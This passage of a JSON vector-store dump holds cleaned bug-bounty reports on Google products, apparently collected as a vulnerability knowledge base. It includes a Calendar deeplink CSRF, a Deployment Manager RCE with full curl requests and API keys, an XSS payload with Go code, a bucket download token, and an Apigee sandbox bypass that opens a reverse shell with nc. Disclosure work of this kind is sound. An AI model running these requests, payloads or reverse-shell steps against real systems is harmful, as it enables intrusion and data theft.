'https://calendar.google.com/calendar/event?eid=<target_eid>&action=RESPOND&rst=2' com.google.android.calendar/com.android.calendar.event.LaunchInfoActivity\r\nYou will notice a toast getting popped up, regarding responding to the event. Open the calendar, check the event and you will notice a response was sent.\r\nYou can change the\r\nrst\r\n1, 2 or 3\r\n, to test the behavior.\r\nUsing Malicious Link\r\nIn this approach, the attacker sends a link to the target user.\r\nThe target user on opening the link see a normal page, but under the hood it redirects to a malicious deepLink, that calendar handles that inturn executes vulnerable code and responds to the calendar event\r\nGrab the\r\npoc.html\r\nfile that is attached with the report\r\nAdd the required fields,\r\nand\r\n. Save it\r\nMake sure ubuntu machine and android device are on the same network.\r\nServe this\r\nfrom ubuntu machine, such that it can be opened in the android device.\r\nOne way is to use\r\nphp\r\n. Execute below commands in a terminal\r\ncd <poc.html_directory>\r\nphp -S <host>:<port>\r\nA server will get started at host:port\r\nOpen the link\r\nhttp://host:port/poc.html\r\nGoogle App\r\nOn visiting it will trigger the bug and the calendar response will get changed.\r\nAttack scenario\r\nThe risk here is that a malicious actor can cause google calendar to respond to calendar events without the knowledge of user. The bug is similar to CSRF", "mimetype": "text/plain", "start_char_idx": 3285, "end_char_idx": 5225, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a9d60b90-02c0-4f27-b912-6618c0c22347": {"__data__": {"id_": "a9d60b90-02c0-4f27-b912-6618c0c22347", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.clean.txt", "file_name": "20250408_175724_258324.clean.txt", "file_type": "text/plain", "file_size": 1708, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c2f52a08-3a45-4a12-8195-1f7c53a97218", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.clean.txt", "file_name": "20250408_175724_258324.clean.txt", "file_type": "text/plain", "file_size": 1708, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4f3ab917a8ff4f3651506d7a5523152b55ef0c2ed26547d2cb23dcb7dd1163d5", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: RCE in Google Cloud Deployment Manager\r\nCreate a Type Provider like this:\r\nPOST /deploymentmanager/staging_dogfood/projects/the-expanse/global/typeProviders HTTP/1.1\r\nHost: www.googleapis.com\r\nAuthorization: Bearer <TOKEN>\r\nContent-Type: application/json\r\nContent-Length: 761\r\n{\r\n\"name\": \"hack\",\r\n\"descriptorUrl\": \"https://test-appengine.sandbox.googleapis.com/$discovery/rest?key=AIzaSyDrGwinQGYOyRu_QcMyYMEtsx3OMwoLuck\",\r\n\"options\": {\r\n\"inputMappings\": [\r\n\"fieldName\": \"Authorization\",\r\n\"methodMatch\": \".*\",\r\n\"value\": \"$.concat(\\\"Bearer \\\", $.googleOauth2AccessToken())\",\r\n\"pythonValue\": \"\",\r\n\"location\": \"HEADER\"\r\n}\r\n]\r\n},\r\n\"googleOptions\": {\r\n\"gslbTarget\": \"blade:apphosting-admin-nightly\",\r\n\"descriptorUrlServerSpec\": \"blade:apphosting-admin-nightly\",\r\n\"injectProject\": true,\r\n\"ownershipKind\": \"GOOGLE\",\r\n\"credentialType\": \"GAIAMINT\",\r\n\"transport\": \"GSLB\",\r\n\"deleteIntent\": \"CREATE_OR_ACQUIRE\",\r\n\"isLocalProvider\": false\r\nAUTH='Authorization: Bearer ';\r\nDESCRIPTOR='http://example.com/any/path?and=param';\r\ncurl -XPOST   'https://www.googleapis.com/deploymentmanager/staging_dogfood/projects/sdcpocs/global/typeProviders?key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM'   --header \"$AUTH\"   --header 'Accept: application/json'   --header 'Content-Type: application/json'   --data '{\"name\":\"hack3\",\"descriptorUrl\":\"'$DESCRIPTOR'\",\"googleOptions\":{\"gslbTarget\":\"ANYGSLBTARGET\",\"descriptorUrlServerSpec\":\"ANYGSLBTARGET\",\"injectProject\":true,\"ownershipKind\":\"GOOGLE\",\"credentialType\":\"GAIAMINT\",\"transport\":\"GSLB\",\"deleteIntent\":\"CREATE_OR_ACQUIRE\",\"isLocalProvider\":false}}'\r\nThen you can read the response on the operation selfLink (but if you do a full target, you can also read any other response).", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1708, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "54056b29-b815-4ee9-8b29-54d5af090a7e": {"__data__": {"id_": "54056b29-b815-4ee9-8b29-54d5af090a7e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.clean.txt", "file_name": "20250408_175719_736495.clean.txt", "file_type": "text/plain", "file_size": 1348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e19ac637-8e24-4ab9-9afe-8e5d584ab8e9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.clean.txt", "file_name": "20250408_175719_736495.clean.txt", "file_type": "text/plain", "file_size": 1348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "a1c1d9891796a63fc5bd16b47a6aeccf1ebb1e0bd883c50dea0d30a2863ead53", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Waze Map Editor is vulnerable to CSRF.\r\nSteps to reproduce:\r\nLogin to waze.com and go to\r\nhttps://www.waze.com/editor\r\nChoose a comment where we can ask the user who reported this issue.\r\nTurn on intercept in Burp, type a comment, and click on send.\r\nGo to Burp -->Right Click-->Engagement Tools-->Generate CSRF PoC\r\nClick test in the browser and drop the request. You will see that the comment was not sent.\r\nPaste the copied URL to the browser.\r\nYou will see a JSON response which confirms that the comment has been created.\r\nGo to\r\nand reload the page.\r\nClick on the comment to which we had added our comment.\r\nYou will see that our comment has been successfully added.\r\nNOTE: You can also copy the HTML code and paste it to create an HTML file, then send the file to the victim who is logged in to their Waze account.\r\nAttack scenario:\r\nAn attacker can use this CSRF vulnerability to force the victims to post comments on the other users' comments. The attacker can send the malicious HTML file to the victim and upon opening the file, the malicious comments will be posted from the victim's account without his knowledge.\r\nAcquisition info:\r\nWaze is a GPS navigation software app owned by Google. Blog-->\r\nhttps://techcrunch.com/2013/06/11/its-official-google-buys-waze-giving-a-social-data-boost-to-its-location-and-mapping-business/", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1348, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7ebfaa9a-a382-465b-932d-b5458040916a": {"__data__": {"id_": "7ebfaa9a-a382-465b-932d-b5458040916a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.clean.txt", "file_name": "20250408_175701_291889.clean.txt", "file_type": "text/plain", "file_size": 1939, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "32b91961-1b02-47a8-a0e4-7cc0d97ae9cb", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.clean.txt", "file_name": "20250408_175701_291889.clean.txt", "file_type": "text/plain", "file_size": 1939, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "f3213abd60bc1834a90ac21706736ab898f55b073f3cafd4ded08643ef53dc11", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nEXIF Geolocation Data Not Stripped From googleapis storage  Uploaded Images\r\nProduct:\r\nhttps://console.cloud.google.com/\r\nURL:\r\nhttps://console.cloud.google.com/apis\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nDescription:-\r\nWhen the user uploads his profile picture, the uploaded image's EXIF Geolocation Data does not get stripped. As a result, anyone can get sensitive information of microweber users like their Geolocation, their Device information like Device Name, Version, Software & Software version used, etc.\r\nWhenever a customer use  Google Cloud does it for storage it also uses the googleapi , But this is a vulnerability if someone Google Cloud does it for storage ,If it is uploaded by users like profile photo etc then it does not extract the meta data of the image.\r\nI have seen more than hundreds of website which google cloud use for profile pictures.\r\nBut when a user updates a photo, it does not remove the meta data . even\r\nhttps://bughunters.google.com/\r\nthis website also use the google storage .\r\nIn the consequences of which the extract location of the user's house means from where exactly that photo was taken, it is visible in its meta data.  and device name version date time etc is visible in all meta data\r\nstep to reproduce:\r\ngo to the\r\nhttps://bughunters.google.com/profile/\r\nand upload a profile pic with the location in the exif.\r\nafter successfully upload a profile pic right click profile and copy the link\r\ngo to the online exif extractor website jimple.com and paste the image link\r\nboom you're able to see user exact location etc\r\nAttack scenario\r\nThis vulnerability is CRITICAL  according to the\r\nbugcrowd\r\n,\r\nhackerone\r\nThis is a P3 level bug. when  a  website/company that will be using Google Cloud, if they want to fix this, then they have no option. as a result of which they will move like another cloud , It is a matter of user's trust and confidentials of their data.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1939, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8a3821f3-59df-4c3a-900a-2129ef70bd23": {"__data__": {"id_": "8a3821f3-59df-4c3a-900a-2129ef70bd23", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.clean.txt", "file_name": "20250408_175703_655288.clean.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "76586415-d2e3-45d2-99cb-591343257a9b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.clean.txt", "file_name": "20250408_175703_655288.clean.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b90126ea8c278de90dfa7d4469d6ad58a81affebb21a9e2dfa2f4524758b494c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nHi!  I found multiple vulnerabilities in Bulk Actions from Google Ads. After some trial and errors, I believe the vulnerability happens to trigger in the PREVIEW function of Bulk Actions.  I decided t\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGoogle Ads\r\nURL:\r\nhttps://ads.google.com/aw/bulk/executions\r\nVulnerability type:\r\nOther\r\nDetails\r\nPs. I don't work in Google so I might be wrong\r\ndashboard id Fictional, it is made up of 10 numeric characters which represents individual dashboard of a user. It is the first numeric string you will encounter when you decode the value of __ar. This might be public but I'm unsure which endpoint leaks it. Eg. 385089529\r\nscript id Fictional, it is made up of 8 numeric characters which represents the individual script in a dashboard. It is the second numeric string you will encounter in /aw_bulk/_/rpc/ScriptService/Preview when you decode the value of __ar. This value will be bruteforced by the attacker to gain the value of execution_id. Eg. 3931988\r\nexecution_id Non-fictional, this parameter name is reflected in /aw_bulk/\r\n/rpc/ExecutionProgressService/GetIncrementalProgress. It is made up of 20 numeric characters which indicates it's not a good idea to bruteforce it. Once this value is combined with dashboard id, it will return information of a script through /aw_bulk/\r\n/rpc/ExecutionProgressService/GetIncrementalProgress. Eg. 1725875959726807315\r\nAttack scenario\r\nScripts Endpoints\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nThe above endpoint will need a valid dashboard id and script id to return a valid execution_id. In the first request it will return an OAuth URL. By navigating to it, it will prompt user to grant access to the script which discloses the script name. After granting access, resend the request and it will return the value of execution_id which can be used in the next endpoint.\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nThis endpoint will need a valid combination of dashboard id and execution_id to return the output details of the script.\r\nUploads Endpoints\r\nThis endpoint is identical to /aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress above however it doesn't return useful information nor it can be chained with others.\r\n/aw_bulk/_/rpc/BulkExecutionStatusService/GetStatus\r\nI'm leaving it here if the security team wants to investigate further or patch it along.\r\nSteps to reproduce\r\nCreate a profile in Google Ads and navigate to Bulk Actions\r\nObserve exists 3 columns which are Rules, Scripts and Uploads\r\nClick Scripts and create a new script with the following code and name it\r\nfunction main() {\r\nLogger.log(\"Hello Google VRP!\")\r\n}\r\nPrepare to intercept a POST request to /aw_bulk/_/rpc/ScriptService/Preview\r\nClick Preview in the bottom right corner\r\nObtain the value of dashboard id and script id\r\nLogin into another account and perform the same thing.\r\nRetrieve the execution_id and use it in /aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress to get the script output information\r\nOptional: Use an account to intercept a POST request to /aw_bulk/_/rpc/ScriptService/Preview and substitude both values to 385089529 and 3931988. Both of them are valid values of dashboard id and script id from my test account.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3274, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "795fe966-dd5a-4152-a5d6-343b0e4132a8": {"__data__": {"id_": "795fe966-dd5a-4152-a5d6-343b0e4132a8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.clean.txt", "file_name": "20250408_175712_695869.clean.txt", "file_type": "text/plain", "file_size": 986, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "19c24b66-7930-4b0d-9a25-675f456a12af", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.clean.txt", "file_name": "20250408_175712_695869.clean.txt", "file_type": "text/plain", "file_size": 986, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "3f7f4cacd28100d5d9843e2440957cac1ec41dd1aad077c9037ee7ab1e20844b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Task Hijacking on launch due to missing taskAffinity on com.google.android.apps.youtube.creator.main.MainActivity\r\nSteps to reproduce: an App like this\r\nhttps://github.com/elye/demo_android_issue_strandhogg_ver_1/blob/main/AttackerApp/app/src/main/AndroidManifest.xml\r\nChange android:taskAffinity to \"com.google.android.apps.youtube.creator\"\r\nStart the attacker app\r\nThen start Youtube Studio and see it opens attacker apps activity\r\nAttack scenario:\r\nStep 1: The attacker tricks victims to install his malicious app either through a third party app store or by contacting the them e.g per sms.\r\n2: One of the victims will inevitabely install the app and open it.\r\n3: Afterwards they will open Youtube Studio.\r\nThe attackers goal is not to target a certain victim but more spray attack until one of the victims fall into his trap. Since the malicious activity is now active, the attacker can imitate Youtube Studio to either gain access to the account or to get sensitive data.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 986, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cadbc57a-93f4-4cd9-9a76-6a1127e2fa98": {"__data__": {"id_": "cadbc57a-93f4-4cd9-9a76-6a1127e2fa98", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.clean.txt", "file_name": "20250408_175652_011090.clean.txt", "file_type": "text/plain", "file_size": 2874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4d5f39d2-9fa1-4eca-908e-fc60439e82db", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.clean.txt", "file_name": "20250408_175652_011090.clean.txt", "file_type": "text/plain", "file_size": 2874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "611fded5a36cd1965bd69e63ed8f735f70e2d9fc23af3d04b4d6ef98392b170f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSandbox Bypass vulnerability in Google Apigee allows a remote attacker to bypass restrictions imposed by Rhino's ClassShutter and execute arbitrary Java code.\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi Google Security Team,\r\nWith great pleasure I want to tell you about another possibility of bypassing the code execution restrictions in Apigee.\r\nAs you already know, it's possible to extend Apigee functionality by custom code - there are JavaScript, JavaCallout and PythonScript policies for this.\r\nJavaCallout and PythonScript policies are protected from malicious code by using Java Security Manager and Java Permissions - every time when user tries to run some code, Java Security Manager checks if there are any call of potentially harmful functions (e.g. binding listeners, accessing filesystem, etc) and prevents this\r\n(more info here)\r\n.\r\nAs for the JavaScript, Apigee has Rhino engine under the hood, which has their own mechanisms to prevent malicios code from running -\r\nClassShutter\r\n(check here)\r\nand forbidding access to\r\ngetClass\r\nmethod. Both mechanisms are implemented in Apigee.\r\nHowever, due to the fact that different policies use different security mechanisms but in the same time they can share same objects by using flow (MessageContext) variables, it's possible to circumvent sandbox logic by creating a special class with malicious code in JavaCallout, passing an object of the special class into JavaScript policy and execute malicious code.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can execute arbitrary Java code. The attacker can bind a reverse shell.\r\nSteps to reproduce\r\nSetup reverse shell listener on your publicly available server with the following command:\r\nnc -lvnp YOUR_PORT\r\n, where YOUR_PORT is a port on your server where you want to accept incoming reverse shell connection.\r\nDownload PoC proxy from the attachments (make-rce-great-again_rev5_2023_06_11.zip).\r\nCreate a proxy in the Apigee UI and upload PoC proxy into it.\r\nSave revision and deploy your proxy.\r\nUse the following command to trigger RCE in JavaScript policy in Apigee and bind a reverse shell, but first replace DOMAIN with Apigee instance domain name, YOUR_IP and YOUR_PORT with the values of your server, where you have reverse shell listener.\r\ncurl -X GET \\\r\n'https://DOMAIN/make-rce-great-again' \\\r\n--header 'ReverseShell-IP: YOUR_IP' \\\r\n--header 'ReverseShell-Port: YOUR_PORT'\r\nObserve reverse shell connection!\r\nPoC explanation\r\nProxy contains only two policies - JavaCallout and JavaScript.\r\nIn JavaCallout I create an object with\r\nrun()\r\nmalicious method and put the object into\r\nrceObject\r\nflow variable. In JavaScript policy I obtain reverse shell IP and port as headers (for easier reproduce), get\r\nfrom flow and execute\r\nmethod, which binds a reverse shell.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2874, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "73fb7e11-2bbd-4700-9124-0b9d1d7d5286": {"__data__": {"id_": "73fb7e11-2bbd-4700-9124-0b9d1d7d5286", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.clean.txt", "file_name": "20250408_175719_579339.clean.txt", "file_type": "text/plain", "file_size": 1808, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "10302f49-b5f3-4cf9-98c5-4053480ceb40", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.clean.txt", "file_name": "20250408_175719_579339.clean.txt", "file_type": "text/plain", "file_size": 1808, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5f0dbc7f4b8c1f0c177bb64e890fbab5bff422d229b31cb32269e2cbfad5e035", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Bucket containing sensitive user data is accessible and freely browseable for all authenticated users\r\nSteps to reproduce:\r\nSign up or log in to\r\nhttps://motus.area120.com\r\n- Motus is a Google-owned service\r\nRetrieve the JWT issued by the website once logged in (e.g. Bearer eyJhbGciOiJS...)\r\nBrowse to GET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/\r\nin a REST client with the aforementioned token in an Authorization header\r\nObserve the files listed. Many are general content which users are supposed to be able to access such as video courses, however there are a large amount of files called things like 2021-01-22T23:08:02_38533/all_namespaces/all_kinds/output-0. These appear to be system exports containing a lot of user information and also Stripe payment provider user IDs.\r\nGet a download token for the file by hitting GET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/{url\r\nencoded filename}\r\nDownload the file by then adding ?alt=media&token={token} to the end of the URL\r\nExample of a file that is accessible:\r\nGET\r\nhttps://firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/2021-01-22T23%3A08%3A02_38533%2Fall_namespaces%2Fall_kinds%2Foutput-0?alt=media&token=ca73a34c-31b1-40a1-bddf-ea0dcb095948\r\nMitigation:\r\nUsers of Area120 should not have permission to browse the bucket freely; nowhere on the website appears to utilize this use case. Arguably, these kinds of system exports may not be appropriate for such a storage location.\r\nNote:\r\nThere appears to be many, many other files like this although I stopped and submitted this report as soon as I noticed this first one contained user data\r\nAttack scenario:\r\nA regular user of Motus Area120, once logged in, could access a large amount of sensitive user information.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1808, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fbbe56e6-d48b-437c-ab7a-f8cc3e4ac50e": {"__data__": {"id_": "fbbe56e6-d48b-437c-ab7a-f8cc3e4ac50e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.clean.txt", "file_name": "20250408_175651_898817.clean.txt", "file_type": "text/plain", "file_size": 2216, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8a6a6c05-cb44-4f6c-b883-781c6bdb6173", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.clean.txt", "file_name": "20250408_175651_898817.clean.txt", "file_type": "text/plain", "file_size": 2216, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ff644e05d7529e3c44d48e4875de6060c5519b07382c1b7a022bd12a407dee9b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGolang net/html parse the < into < inside style tag that could lead to XSS\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGolang\r\nURL:\r\ngithub.com/golang/net\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi there.\r\ni've been checking the golang net/html lately and i found this.\r\nnet/html parser will parse the < and > symbol into &lt(; )and &gt(;) in some context. and leave it as it is in some context.\r\nbut the same as the browser. net/html did parse the &lt(;) into < inside of the style tag.\r\nif somehow the website give the user to insert / input only the h1, h2, h3 but the rest getting deleted it could also lead to some vulnerabilities.\r\nfor example. this payload right here\r\n<svg><style>/* &lt;/style> &lt;img src=x onerror=alert(document.domain)>\r\nif that payload get parse with this code\r\npackage main\r\nimport (\r\n\"bytes\"\r\n\"errors\"\r\n\"fmt\"\r\n\"golang.org/x/net/html\"\r\n\"io\"\r\n\"log\"\r\n\"strings\"\r\n)\r\nfunc Body(doc *html.Node) (*html.Node, error) {\r\nvar body *html.Node\r\nvar crawler func(*html.Node)\r\ncrawler = func(node *html.Node) {\r\nif node.Type == html.ElementNode && node.Data == \"body\" {\r\nbody = node\r\nreturn\r\n}\r\nfor child := node.FirstChild; child != nil; child = child.NextSibling {\r\ncrawler(child)\r\ncrawler(doc)\r\nif body != nil {\r\nreturn body, nil\r\nreturn nil, errors.New(\"Missing <body> in the node tree\")\r\nfunc renderNode(n *html.Node) string {\r\nvar buf bytes.Buffer\r\nw := io.Writer(&buf)\r\nhtml.Render(w, n)\r\nreturn buf.String()\r\nconst parsethis = \"<body><svg><style>/* &lt;/style> &lt;img src=x onerror=alert(document.domain)>\"\r\nfunc main() {\r\ndoc, _ := html.Parse(strings.NewReader(parsethis))\r\nbn, er := Body(doc)\r\nif er != nil {\r\nlog.Fatal(er)\r\nbody := renderNode(bn)\r\nfmt.Println(\"\\n------P2\\n\", parsethis, \"\\n\", body, \"\\n-------\\n\")\r\nit will return this (< turn into <)\r\n<body><svg><style>/* </style> <img src=x onerror=alert(document.domain)></style></svg></body>\r\nbut because the the input only allowed the h1 tag. the svg tag will get removed and the rest will be served. because the rest is the text / content inside the <style>.\r\nand the <style> also been closed and onerror inside of the <img> will be triggered.\r\nAttack scenario\r\nattacker could inject malicious javascript code.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2216, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fcf77fdc-5941-4e5f-8224-4b9c326683a5": {"__data__": {"id_": "fcf77fdc-5941-4e5f-8224-4b9c326683a5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.clean.txt", "file_name": "20250408_175733_390728.clean.txt", "file_type": "text/plain", "file_size": 2682, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "82a6cdae-f7c5-4cba-912a-27dd6a957fff", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.clean.txt", "file_name": "20250408_175733_390728.clean.txt", "file_type": "text/plain", "file_size": 2682, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "bf8182fd083ce2121ba5553ea3cb4bf576fe58ae9741b49c3d01692f87e1986e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: XSS in android/ios stacktrace can \"force\" user to re-login. Login-credentials are sent to the attacker. Credentials for another Fabric account can be easily extracted. The attacker gains access to all sensitive information in Fabric.\r\nSteps to reproduce:\r\nDownload and unzip the\r\ncomplete\r\nPOC Android application from\r\nhttps://drive.google.com/file/d/1MClpBVOK6JqxPbx2kldCsrfEgY4hgjsU/view?usp=sharing\r\n(The malicious payload is in Activity.kt)\r\nSet package and io.fabric.ApiKey in AndroidManifest.xml (extracted from target apk)\r\nSet applicationId, versionCode and versionName in app/build.gradle (extracted from target apk)\r\nCompile and start the app several times (it crashes 1 second after the start, thats intended)\r\nWait several hours. By starting the app multiple times the developers of the targeted App that uses Crashlytics will even get a mail if enabled (velocity alert).\r\n(Current values of package, io.fabric.ApiKey and applicationId are the ones from my own app)\r\nBrowser/OS: Current Chrome Version 68\r\nAttack scenario:\r\nEveryone can exploit the vulnerability. Only some public information about the target Android-application is needed, which can be extracted from the apk-file of the target App by unzipping it and copying the values. The attacker gains full control of the target Fabric account, sees all sensitive information about the App (Crashlytics, Answers and all other services that are linked with the Fabric account). The attacker may even find sensitive user-information that is stored in other crashlogs.\r\nThe attacked developer checks Crashlytics (either by clicking the velocity alert mail or by investigating the now probably most occurred crash) since the attacker sent several crash reports to Crashlytics.\r\nThe attacked developer sees a Stacktrace that leads to no clue except the error message \"See log for more information.\" He of course clicks at the green button \"View all Sessions\" to see the logs.\r\nThe attacked developer gets prompted once to re-authenticate due to (false) session timeout. The domain is \"\r\nhttps://fabric.io/login\"\r\n, so he will trust the site. (In fact Google Chrome will even prefill the credentials (if enabled) since it detects that it is on the correct site.)\r\nThe credentials are sent to a attackers site, in the example 